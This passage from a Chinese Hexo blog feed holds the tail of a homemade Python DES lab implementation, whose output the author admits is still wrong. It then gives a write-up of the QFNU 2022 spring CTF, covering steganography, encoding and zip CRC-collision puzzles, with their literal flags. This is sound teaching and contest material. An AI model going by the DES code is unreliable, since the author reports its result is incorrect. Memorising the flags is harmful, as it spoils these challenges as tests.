keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0010'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0011'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0100'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0101'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0110'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'0111'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1000'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1001'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1010'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1011'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1100'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1101'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token string">'1110'</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token number">15</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">my_bin</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0000'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0001'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0010'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0011'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0100'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0101'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0110'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">7</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'0111'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>      a <span class="token operator">=</span> <span class="token string">'1000'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1001'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1010'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">11</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1011'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">12</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1100'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">13</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1101'</span>    <span class="token keyword">elif</span> a <span class="token operator">==</span> <span class="token number">14</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1110'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token string">'1111'</span>    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token builtin">list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">list</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>temp<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token builtin">list</span>K <span class="token operator">=</span> child_key<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取k1~k16的子密钥存依次放在列表K中</span>L0<span class="token punctuation">,</span>R0 <span class="token operator">=</span> create_L0R0<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取L0,R0</span><span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#16轮循环</span>    L <span class="token operator">=</span> R0    temp <span class="token operator">=</span> get_lastR<span class="token punctuation">(</span>K<span class="token punctuation">,</span>R0<span class="token punctuation">,</span>num<span class="token punctuation">)</span>    temp <span class="token operator">=</span> change<span class="token punctuation">(</span>temp<span class="token punctuation">)</span>    <span class="token comment">#改变一下格式，使temp和L0格式一样，方便实现异或运算</span>    R <span class="token operator">=</span> yihuo<span class="token punctuation">(</span>L0<span class="token punctuation">,</span>temp<span class="token punctuation">)</span>    L0 <span class="token operator">=</span> L    R0 <span class="token operator">=</span> Rmw <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#存放最终的L,R</span>mw<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>L<span class="token punctuation">)</span>mw<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>R<span class="token punctuation">)</span>rep <span class="token operator">=</span> my_read<span class="token punctuation">(</span><span class="token string">"IP-1.txt"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#进行最后一步逆置换并输出密文</span>miwen <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>linshi <span class="token operator">=</span> <span class="token string">''</span>new_miwen<span class="token operator">=</span><span class="token string">''</span>new_miwen2<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> m <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rep<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        linshi<span class="token operator">=</span>linshi<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>mw<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>rep<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>linshi<span class="token punctuation">)</span>new_miwen <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'.&#123;8&#125;'</span><span class="token punctuation">,</span> linshi<span class="token punctuation">)</span>str_1 <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> b <span class="token keyword">in</span> new_miwen<span class="token punctuation">:</span>    str_1 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>str_1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后的结果实际上也是存在一些问题，在个人后面的验证中也没有找清楚问题出在了哪里？但是大致思路应该没问题</p><h3 id="文件读写操作"><a href="#文件读写操作" class="headerlink" title="文件读写操作:"></a>文件读写操作:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">my_read</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>row<span class="token punctuation">,</span>col<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 读取各种矩阵----参数为文件名和目标矩阵的行列数</span>    sz <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>col<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>row<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> s1<span class="token punctuation">:</span>        lists <span class="token operator">=</span> s1<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span>            <span class="token comment"># 以 , 将字符串分开</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sz<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                sz<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> lists<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>    <span class="token keyword">return</span> sz    <span class="token comment"># 返回一个该矩阵的二维数组</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 实验记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年QFNU春季赛WP</title>
      <link href="/2022/03/30/2021%E6%98%A5%E5%AD%A3%E8%B5%9BWP/"/>
      <url>/2022/03/30/2021%E6%98%A5%E5%AD%A3%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<h1 id="2022年春季赛WP"><a href="#2022年春季赛WP" class="headerlink" title="2022年春季赛WP"></a>2022年春季赛WP</h1><p>[TOC]</p><h2 id="1-MISC"><a href="#1-MISC" class="headerlink" title="1. MISC"></a>1. MISC</h2><h3 id="1-签到"><a href="#1-签到" class="headerlink" title="1.签到"></a>1.签到</h3><p>扫码得到flag</p><h3 id="2-签个到"><a href="#2-签个到" class="headerlink" title="2.签个到"></a>2.签个到</h3><p>base85解码,base32解码,base64解码，得到微信号（很明显看出）</p><blockquote><p>上面那个很明显看出是王文旭师哥写的，但是在师哥们在实验室出题的时候，我真没想出来，被王师哥坑道了，我以为是加密…….</p></blockquote><p>微信搜索好友，查看个性签名得到flag ,也是因为当时我们觉得这个签到，有点离谱，就又出了一道真签到。</p><h3 id="3-The-flag-is-under-the-picture"><a href="#3-The-flag-is-under-the-picture" class="headerlink" title="3.The flag is under the picture"></a>3.The flag is under the picture</h3><p>这一道题目，思路来自于在过去做过的一道，flag_under_the_picture和山东省科技节的一道大赛杂项。其实，在设计的时候稍微降了下难度，原题真的是图片隐写，但是考虑这次考察了一些其他内容，就在不在这一道题考察图片隐写，至于山东科技节的真题当时flag是两部分，一部分在文字类型里，另一部分则是隐藏文字。</p><p>这个算是一个签到(信息收集？)难度应该不大。</p><blockquote><p>1 under_the_picture，图片在word里的位置有很多种，环绕好像是最常见的，当时如果选择浮在文字之上就可以在图片下隐藏一些信息。</p><p>2 word实际上可以看做一个压缩包，我们可以在里面秘密的添加一些文件</p><p>3 在word下，我们可以更改字体格式为任意值，虽然这在显示中是默认值，但是字体名确实是你自定义的那些</p><p>4  隐藏文字，可以在word中设置显示隐藏文字</p></blockquote><p>flag{this_is_a_Sign_in_You_are_well}</p><blockquote><p>在这边师哥道歉下，我这次出题还是考虑不周，文档里面可以找到的所有信息和最后剩余的其实差了一个下划线_ ,虽然这种少下划线的平时做题也有，但这次我确实也没考虑这个，给师弟们放的Hint里面也误导了一些师弟…..</p></blockquote><h3 id="4-Virus-Killer"><a href="#4-Virus-Killer" class="headerlink" title="4.Virus_Killer"></a>4.Virus_Killer</h3><p>这是一道让所有 参赛选手都可以参与的题目，有谁能不喜欢我的世界呢？</p><p>我修改了包括终末之诗在内的一些内容，flag就在终末之诗里面，击败末影龙就能得到<strong>flag</strong>。</p><p>当然我觉得正常应该没人会是通过 杀死末影龙看到终末之诗吧，在配置文件里有一个 病毒杀手.jar用压缩包格式打开可以在里面找到终末之诗的配置文件，end</p><p>你会得到这一串</p><pre class="line-numbers language-none"><code class="language-none">§3恭喜你§2PLAYERNAME§3成功击败了冠状病毒§2来到了这里§3现在§2你将获得你的奖励§3仔细看§6ZmxhZ3tUaGVfdmlydXNfd2lsbF9wYXNzfQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64解码得到flag flag{The_virus_will_pass}</p><h3 id="5-拆红包"><a href="#5-拆红包" class="headerlink" title="5.拆红包"></a>5.拆红包</h3><p>Linux下binwalk分离，得到一个txt（41,21,33,45,11,14,13）<br>使用010改变图片高度(WORD Y_image)，下方为一个鼓，由此联想到敲击码打开文件，下面放一张敲击码图</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/%E5%A4%8D%E4%B9%A0/202203271009459.png"></p><h3 id="6-兔死who悲"><a href="#6-兔死who悲" class="headerlink" title="6.兔死who悲"></a>6.兔死who悲</h3><p>这个题，应该是来自王文旭师哥，兔吗，这很明显说的是rabbit密码，在图片中有一句我需要爆破，在比赛过程中，我们也放出了hint给出了zip-crc-cracker-master的下载地址</p><p>其实做出来的数量较我们的预期少了，因为提示给的很充足，使用binwalk -e分解图片可以得到flag.txt文件，这个是Rabbit加密的密文文件，在同时还存在一个加密文件夹，使用爆破跑是跑不出来的，这里需要crc碰撞</p><p>可以通过python3 crack.py key.zip简单得到解密秘钥(0_0)，解密得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;u_really_know_rabbits_and_crack&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-黑化的维亚"><a href="#7-黑化的维亚" class="headerlink" title="7.黑化的维亚"></a>7.黑化的维亚</h3><p>用stegsolve打开，查看不同色域下的图片</p><p><img src="https://s1.ax1x.com/2022/03/27/qwIgDf.png" alt="qwIgDf.png"></p><p>可以在相机的属性中找到序列号abcd，用abcd作为秘钥加密一次就得到flag。</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;wowowoheihuale!123&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-Retrieve-the-passcode"><a href="#8-Retrieve-the-passcode" class="headerlink" title="8.Retrieve_the_passcode"></a>8.Retrieve_the_passcode</h3><p>附件为一个rar文件和scatter.txt，从文件名入手，010内直接更改编辑。本题的scatter意思为散点，在MATLAB 为函数 在向量 x 和 y 指定的位置创建一个包含圆形的散点图。内数据格式为num,num,num;<br>使用Python处理数据，画出散点图即为压缩包密码（或直接暴力）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> mathlines <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"scatter.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>X <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>Y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> line <span class="token keyword">in</span> lines<span class="token punctuation">:</span>    x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z <span class="token operator">=</span> line<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    X<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    Y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>X<span class="token punctuation">,</span> Y<span class="token punctuation">,</span> s<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开pdf为一串摩斯密码，解码得flag</p><h3 id="9-0和1的故事"><a href="#9-0和1的故事" class="headerlink" title="9.0和1的故事"></a>9.0和1的故事</h3><p>这个题的话我是套了以前做过的几个题，给大家添麻烦了，如果我没猜错的话，不少师弟师妹应该做过一个01字符串生成二维码的题目，师哥为了不让大家这么快获得flag，在外面套了一个base64转图片。因为得到是图片的形式了，后面的处理方式就看大家的脑洞。</p><p>基本上就是识图，生成01串，然后将他还原成二维码，这里还有个坑，我专门把标志位那块的01都换成了0，了解二维码的形状就能很轻松的将其复原。</p><p>这是一个0,1字符串生成二维码的脚本，没有实现的师弟师妹们可以看看</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Imagex <span class="token operator">=</span> <span class="token number">29</span>y <span class="token operator">=</span> <span class="token number">29</span>im <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">)</span>white <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span>black <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        ff <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> ff<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> black<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> white<span class="token punctuation">)</span>im<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当时我在看一个类似题目的题解的时候，有位大哥是有Excel完成的…..我觉得师弟中应该没有这样干的吧</p><h3 id="10-有手就行"><a href="#10-有手就行" class="headerlink" title="10.有手就行"></a>10.有手就行</h3><p>B.base64.txt里的编码内容是正确的flag</p><p>tp文件是png图片，文件尾部有提示的base64，解出来是a=1,b=1</p><p>使用脚本将一大串经过多次加密的base64解出来后是:gmbh{xf1d0nf_u0_cvhlv_}</p><p>结合a=1,b=2和仿射密码的特征，g前一位是f，m前一位是l，以此类推可以发现是仿射密码，打开仿射密码网站，将密文输进去，然后在a处输入1，b处输入即时正确的flag</p><p>最终flag是：<br>flag{we1c0me_t0_bugku_30}</p><p>脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64a <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'B.base64.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> a<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>c <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    base64_de <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64_de<span class="token punctuation">)</span>    b <span class="token operator">=</span> base64_de    c<span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-CRYPTO"><a href="#2-CRYPTO" class="headerlink" title="2.CRYPTO"></a>2.CRYPTO</h2><h3 id="1-EzRSA"><a href="#1-EzRSA" class="headerlink" title="1.EzRSA"></a>1.EzRSA</h3><p>观察发现q是p的下一个素数，p和q相邻，考虑yafu分解n。 </p><p>p = 60973413304835230363868586902004006717237117044275222095949523787438821909233 </p><p>q = 60973413304835230363868586902004006717237117044275222095949523787438821908819 </p><p>接下来是正常rsa求解。 </p><p>exp： </p><pre class="line-numbers language-python" 